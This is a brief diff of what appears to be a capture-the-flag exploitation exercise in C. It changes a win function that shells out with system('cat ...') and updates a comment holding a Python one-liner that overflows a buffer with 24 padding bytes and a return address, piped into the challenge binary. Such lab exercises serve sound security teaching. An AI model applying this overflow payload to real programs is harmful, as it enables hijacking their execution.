@@ -3,7 +3,7 @@
 
 int flaggyyy(){
 	printf("\nAlright! Take the flag..\n");
-	system("cat /home/keerthi/iQube/flag");
+	system("cat /bin/pwn3");
 	return 0;
 }
 int func(){
@@ -24,6 +24,6 @@ int main(){
 abcdefghijklmn''''stuvwxyz
 exploit:
 abcdefghijklmn''''stuvwx####cdefghijklmn''''stuvwxyz
-python -c 'print "x"*24+"\x08\x04\x84\x86"[::-1]'|./rev2
+python -c 'print "x"*24+"\x08\x04\x84\x86"[::-1]'|./pwn3
 
 */
